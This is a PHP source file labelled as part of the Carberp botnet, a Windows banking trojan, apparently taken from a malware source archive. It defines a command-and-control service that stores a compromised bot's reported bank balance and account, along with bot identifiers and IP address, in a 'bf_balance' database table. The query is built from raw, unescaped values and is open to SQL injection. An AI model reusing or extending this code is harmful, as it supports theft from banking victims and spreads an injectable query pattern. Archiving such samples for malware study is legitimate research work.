/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
<?php

class ServiceBalance {
    private $bot, $system, $mysqli;
    
    function __construct(){
        global $bot, $system, $mysqli;
        $this->bot = &$bot;
        $this->system = &$system;
        $this->db = &$mysqli;
    }
    
    function setBalance($balance = '', $acc = ''){
        if(empty($balance)) return false;
        return $this->db->query("INSERT INTO bf_balance set userid = '".$this->bot->userid."', prefix = '".$this->bot->prefix."', uid = '".$this->bot->uid."', ip='".$_SERVER['REMOTE_ADDR']."', acc='".$acc."', system='".$this->system->nid."', balance='".$balance."' on duplicate key update post_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
    }
}

RegisterService("ServiceBalance");

?>